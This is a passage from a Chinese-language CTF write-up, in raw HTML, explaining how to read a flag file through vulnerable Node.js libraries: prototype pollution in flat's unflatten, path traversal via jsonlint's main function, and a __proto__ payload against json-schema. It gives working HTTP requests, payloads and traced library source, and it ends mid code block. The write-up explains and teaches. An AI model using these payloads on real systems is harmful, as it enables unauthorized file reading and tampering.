class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 35</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/"23-RVcPh+LK1Ac7n2mAq1KjFd049Xo"</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 16:54:07 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">{"validator":{},"data":"000AAAA\n"}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个其实是 7/18 @po6ix 提出了 flat lib 中的 <code>unflatten</code>  存在原型链污染：<a href="https://github.com/hughsk/flat/issues/105" target="_blank" rel="noopener">https://github.com/hughsk/flat/issues/105</a></p><p>简单 debug 跟了一下，简化了一下原函数代码：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unflatten</span> (<span class="hljs-params">target, opts</span>) </span>{</span><br><span class="line">  opts = opts || {}</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">const</span> delimiter = opts.delimiter || <span class="hljs-string">'.'</span></span><br><span class="line">  <span class="hljs-keyword">const</span> overwrite = opts.overwrite || <span class="hljs-literal">false</span></span><br><span class="line">  <span class="hljs-keyword">const</span> transformKey = opts.transformKey || keyIdentity</span><br><span class="line">  <span class="hljs-keyword">const</span> result = {}</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">Object</span>.keys(target).forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">key</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">const</span> split = key.split(delimiter).map(transformKey)</span><br><span class="line">    <span class="hljs-keyword">let</span> key1 = getkey(split.shift())</span><br><span class="line">    <span class="hljs-keyword">let</span> key2 = getkey(split[<span class="hljs-number">0</span>])</span><br><span class="line">    <span class="hljs-keyword">let</span> recipient = result</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span> (key2 !== <span class="hljs-literal">undefined</span>) {</span><br><span class="line">      <span class="hljs-keyword">const</span> type = <span class="hljs-built_in">Object</span>.prototype.toString.call(recipient[key1])</span><br><span class="line">      <span class="hljs-keyword">const</span> isobject = (</span><br><span class="line">        type === <span class="hljs-string">'[object Object]'</span> ||</span><br><span class="line">        type === <span class="hljs-string">'[object Array]'</span></span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      <span class="hljs-comment">// do not write over falsey, non-undefined values if overwrite is false</span></span><br><span class="line">      <span class="hljs-keyword">if</span> (!overwrite &amp;&amp; !isobject &amp;&amp; <span class="hljs-keyword">typeof</span> recipient[key1] !== <span class="hljs-string">'undefined'</span>) {</span><br><span class="line">        <span class="hljs-keyword">return</span></span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="hljs-keyword">if</span> ((overwrite &amp;&amp; !isobject) || (!overwrite &amp;&amp; recipient[key1] == <span class="hljs-literal">null</span>)) {</span><br><span class="line">        recipient[key1] = (</span><br><span class="line">          <span class="hljs-keyword">typeof</span> key2 === <span class="hljs-string">'number'</span> &amp;&amp;</span><br><span class="line">          !opts.object ? [] : {}</span><br><span class="line">        )</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      recipient = recipient[key1]</span><br><span class="line">      <span class="hljs-keyword">if</span> (split.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">        key1 = getkey(split.shift())</span><br><span class="line">        key2 = getkey(split[<span class="hljs-number">0</span>])</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// unflatten again for 'messy objects'</span></span><br><span class="line">    recipient[key1] = unflatten(target[key], opts)</span><br><span class="line">  })</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> result</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们传入<code>{"__proto__.path": "/flag"}</code> 到 <code>target</code> 变量，然后经过一些判断以及操作，经过 <code>while</code> 第一轮循环得到:</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient = recipient[key1]<span class="hljs-comment">//recipient = {}["__proto__"]</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>此时 <code>recipient</code> 就指向了 <code>Function.prototype</code> ，而循环结束之后递归执行 <code>unflatten</code> 函数，此时</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient[key1] = unflatten(target[key], opts) <span class="hljs-comment">// recipient['path'] = unflatten("/flag", {})</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>而因为传入的第一个参数也就是 <code>/flag</code>  为字符串，被 <code>unflatten</code> 直接返回，也就是说最终结果为：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient[key1] = <span class="hljs-string">'/flag'</span><span class="hljs-comment">//recipient['path'] = '/flag'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>整个流程可以简化为：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> obj = {};</span><br><span class="line"><span class="hljs-keyword">var</span> a = {};</span><br><span class="line">obj = obj[<span class="hljs-string">"__proto__"</span>];</span><br><span class="line">obj[<span class="hljs-string">'path'</span>] = <span class="hljs-string">'/flag'</span>;</span><br><span class="line"><span class="hljs-built_in">console</span>.log(obj.path);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(a.path);</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样就完成了原型链污染的效果，我们就可以将 <code>config.path</code> 污染成 flag 路径了，也就可以读到 flag 了</p><p>存在一些变形比如：</p><ul><li>更改传输方式为<code>application/x-www-form-urlencoded</code></li><li>更改引用路径<code>POST /config/validated/..%2fnode_modules%2fflat/unflatten HTTP/1.1</code></li></ul><p>顺便，flat 已经修复了这个原型链污染，修复方式是将<code>__proto__</code>设置为 <code>key1</code> 的黑名单：<a href="https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8" target="_blank" rel="noopener">https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8</a></p><h3 id="Jsonlint"><a href="#Jsonlint" class="headerlink" title="Jsonlint"></a>Jsonlint</h3><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/jsonlint/main</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 33</span><br><span class="line"></span><br><span class="line">{"1":"../../../../../../../flag"}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">500</span> Internal Server Error</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 1162</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/"48a-J1p7tUkAXQsyvitsec7yxDGU9yc"</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 16:58:55 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Parse error on line 1:</span><br><span class="line"><span class="hljs-attribute">000AAAA</span></span><br><span class="line"><span class="hljs-attribute">^</span></span><br><span class="line">Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">&lt;pre&gt;Error: Parse error on line 1:</span><br><span class="line"><span class="hljs-attribute">000AAAA</span></span><br><span class="line"><span class="hljs-attribute">^</span></span><br><span class="line">Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;</span><br><span class="line">    at Object.parseError (/service/node_modules/jsonlint/lib/jsonlint.js:55:11)</span><br><span class="line">    at Object.parse (/service/node_modules/jsonlint/lib/jsonlint.js:132:22)</span><br><span class="line">    at Object.commonjsMain [as main] (/service/node_modules/jsonlint/lib/jsonlint.js:427:27)</span><br><span class="line">    at /service/routes/config.js:22:36</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at next (/service/node_modules/express/lib/router/route.js:137:13)</span><br><span class="line">    at Route.dispatch (/service/node_modules/express/lib/router/route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at /service/node_modules/express/lib/router/index.js:281:22</span><br><span class="line">    at param (/service/node_modules/express/lib/router/index.js:354:14)&lt;/pre&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个也比较简单，jsonlint lib 中有一个 main 函数存在直接引用文件的操作：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exports.main = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">commonjsMain</span>(<span class="hljs-params">args</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!args[<span class="hljs-number">1</span>])</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">'Usage: '</span>+args[<span class="hljs-number">0</span>]+<span class="hljs-string">' FILE'</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> process !== <span class="hljs-string">'undefined'</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> source = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>).readFileSync(<span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>).join(process.cwd(), args[<span class="hljs-number">1</span>]), <span class="hljs-string">"utf8"</span>);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">var</span> cwd = <span class="hljs-built_in">require</span>(<span class="hljs-string">"file"</span>).path(<span class="hljs-built_in">require</span>(<span class="hljs-string">"file"</span>).cwd());</span><br><span class="line">        <span class="hljs-keyword">var</span> source = cwd.join(args[<span class="hljs-number">1</span>]).read({<span class="hljs-attr">charset</span>: <span class="hljs-string">"utf-8"</span>});</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> exports.parser.parse(source);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>而 <code>args</code> 则是我们传入的<code>req.body</code>，也就是<code>{"1":"../../../../../../../flag"}</code>，直接引入 flag 文件导致报错回显即可。</p><h3 id="json-schema"><a href="#json-schema" class="headerlink" title="json-schema"></a>json-schema</h3><p>这个库算是官方给的一个 hint 吧，因为算是在<code>/config/validated</code>路由默认使用的 lib ，而且搜了一下是一个废弃的仓库：<a href="https://github.com/kriszyp/json-schema/" target="_blank" rel="noopener">https://github.com/kriszyp/json-schema/</a> ，而且看起来还能算是一个 0day</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"$schema"</span>: {<span class="hljs-attr">"properties"</span>: {<span class="hljs-attr">"__proto__"</span>: {<span class="hljs-attr">"properties"</span>: {<span class="hljs-attr">"path"</span>: {<span class="hljs-attr">"default"</span>: <span class="hljs-string">"/flag"</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>经过简单调试可以发现主要问题在两个函数：<code>checkObj</code> 与 <code>checkProp</code> </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// validate a value against a property definition</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkProp</span>(<span class="hljs-params">value, schema, path, i</span>) </span>{</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">var</span> l;</span><br><span class="line">  path += path ? <span class="hljs-keyword">typeof</span> i == <span class="hljs-string">'number'</span> ? <span class="hljs-string">'['</span> + i + <span class="hljs-string">']'</span>: <span class="hljs-keyword">typeof</span> i == <span class="hljs-string">'undefined'</span> ? <span class="hljs-string">''</span>: <span class="hljs-string">'.'</span> + i: i;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addError</span>(<span class="hljs-params">message</span>) </span>{</span><br><span class="line">    errors.push({</span><br><span class="line">      property: path,</span><br><span class="line">      message: message</span><br><span class="line">    });</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> schema != <span class="hljs-string">'object'</span> || schema <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) &amp;&amp; (path || <span class="hljs-keyword">typeof</span> schema != <span class="hljs-string">'function'</span>) &amp;&amp; !(schema &amp;&amp; getType(schema))) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema == <span class="hljs-string">'function'</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (! (value <span class="hljs-keyword">instanceof</span> schema)) {</span><br><span class="line">        addError(<span class="hljs-string">"is not an instance of the class/constructor "</span> + schema.name);</span><br><span class="line">      }</span><br><span class="line">    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (schema) {</span><br><span class="line">      addError(<span class="hljs-string">"Invalid schema/property definition "</span> + schema);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (_changing &amp;&amp; schema.readonly) {</span><br><span class="line">    addError(<span class="hljs-string">"is a readonly field, it can not be changed"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (schema[<span class="hljs-string">'extends'</span>]) { <span class="hljs-comment">// if it extends another schema, it must pass that schema as well</span></span><br><span class="line">    checkProp(value, schema[<span class="hljs-string">'extends'</span>], path, i);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">// validate a value against a type definition</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkType</span>(<span class="hljs-params">type, value</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (type) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> type == <span class="hljs-string">'string'</span> &amp;&amp; type != <span class="hljs-string">'any'</span> &amp;&amp; (type == <span class="hljs-string">'null'</span> ? value !== <span class="hljs-literal">null</span>: <span class="hljs-keyword">typeof</span> value != type) &amp;&amp; !(value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span> &amp;&amp; type == <span class="hljs-string">'array'</span>) &amp;&amp; !(value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Date</span> &amp;&amp; type == <span class="hljs-string">'date'</span>) &amp;&amp; !(type == <span class="hljs-string">'integer'</span> &amp;&amp; value % <span class="hljs-number">1</span> === <span class="hljs-number">0</span>)) {</span><br><span class="line">        <span class="hljs-keyword">return</span> [{</span><br><span class="line">          property: path,</span><br><span class="line">          message: (<span class="hljs-keyword">typeof</span> value) + <span class="hljs-string">" value found, but a "</span> + type + <span class="hljs-string">" is required"</span></span><br><span class="line">        }];</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> unionErrors = [];</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; type.length; j++) { <span class="hljs-comment">// a union type</span></span><br><span class="line">          <span class="hljs-keyword">if</span> (! (unionErrors = checkType(type[j], value)).length) {</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (unionErrors.length) {</span><br><span class="line">          <span class="hljs-keyword">return</span> unionErrors;</span><br><span class="line">        }</span><br><span class="line">      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> type == <span class="hljs-string">'object'</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> priorErrors = errors;</span><br><span class="line">        errors = [];</span><br><span class="line">        checkProp(value, type, path);</span><br><span class="line">        <span class="hljs-keyword">var</span> theseErrors = errors;</span><br><span class="line">        errors = priorErrors;</span><br><span class="line">        <span class="hljs-keyword">return</span> theseErrors;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> [];</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (schema.required) {</span><br><span class="line">      addError(<span class="hljs-string">"is missing and it is required"</span>);</span><br><span class="line">    }</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    errors = errors.concat(checkType(getType(schema), value));</span><br><span class="line">    <span class="hljs-keyword">if</span> (schema.disallow &amp;&amp; !checkType(schema.disallow, value).length) {</span><br><span class="line">      addError(<span class="hljs-string">" disallowed value was matched"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (value !== <span class="hljs-literal">null</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.items) {</span><br><span class="line">          <span class="hljs-keyword">var</span> itemsIsArray = schema.items <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>;</span><br><span class="line">          <span class="hljs-keyword">var</span> propDef = schema.items;</span><br><span class="line">          <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, l = value.length; i &lt; l; i += <span class="hljs-number">1</span>) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (itemsIsArray) propDef = schema.items[i];</span><br><span class="line">            <span class="hljs-keyword">if</span> (options.coerce) value[i] = options.coerce(value[i], propDef);</span><br><span class="line">            errors.concat(checkProp(value[i], propDef, path, i));</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.minItems &amp;&amp; value.length &lt; schema.minItems) {</span><br><span class="line">          addError(<span class="hljs-string">"There must be a minimum of "</span> + schema.minItems + <span class="hljs-string">" in the array"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.maxItems &amp;&amp; value.length &gt; schema.maxItems) {</span><br><span class="line">          addError(<span class="hljs-string">"There must be a maximum of "</span> + schema.maxItems + <span class="hljs-string">" in the array"</span>);</span><br><span class="line">        }</span><br><span class="line">      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (schema.properties || schema.additionalProperties) {</span><br><span class="line">        errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.pattern &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">'string'</span> &amp;&amp; !value.match(schema.pattern)) {</span><br><span class="line">        addError(<span class="hljs-string">"does not match the regex pattern "</span> + schema.pattern);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.maxLength &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">'string'</span> &amp;&amp; value.length &gt; schema.maxLength) {</span><br><span class="line">        addError(<span class="hljs-string">"may only be "</span> + schema.maxLength + <span class="hljs-string">" characters long"</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.minLength &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">'string'</span> &amp;&amp; value.length &lt; schema.minLength) {</span><br><span class="line">        addError(<span class="hljs-string">"must be at least "</span> + schema.minLength + <span class="hljs-string">" characters long"</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.minimum !== <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-keyword">typeof</span> schema.minimum &amp;&amp; schema.minimum &gt; value) {</span><br><span class="line">        addError(<span class="hljs-string">"must have a minimum value of "</span> + schema.minimum);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.maximum !== <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-keyword">typeof</span> schema.maximum &amp;&amp; schema.maximum &lt; value) {</span><br><span class="line">        addError(<span class="hljs-string">"must have a maximum value of "</span> + schema.maximum);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema[<span class="hljs-string">'enum'</span>]) {</span><br><span class="line">        <span class="hljs-keyword">var</span> enumer = schema[<span class="hljs-string">'enum'</span>];</span><br><span class="line">        l = enumer.length;</span><br><span class="line">        <span class="hljs-keyword">var</span> found;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; l; j++) {</span><br><span class="line">          <span class="hljs-keyword">if</span> (enumer[j] === value) {</span><br><span class="line">            found = <span class="hljs-number">1</span>;</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (!found) {</span><br><span class="line">          addError(<span class="hljs-string">"does not have a value in the enumeration "</span> + enumer.join(<span class="hljs-string">", "</span>));</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.maxDecimal == <span class="hljs-string">'number'</span> &amp;&amp; (value.toString().match(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">"\\.[0-9]{"</span> + (schema.maxDecimal + <span class="hljs-number">1</span>) + <span class="hljs-string">",}"</span>)))) {</span><br><span class="line">        addError(<span class="hljs-string">"may only have "</span> + schema.maxDecimal + <span class="hljs-string">" digits of decimal places"</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 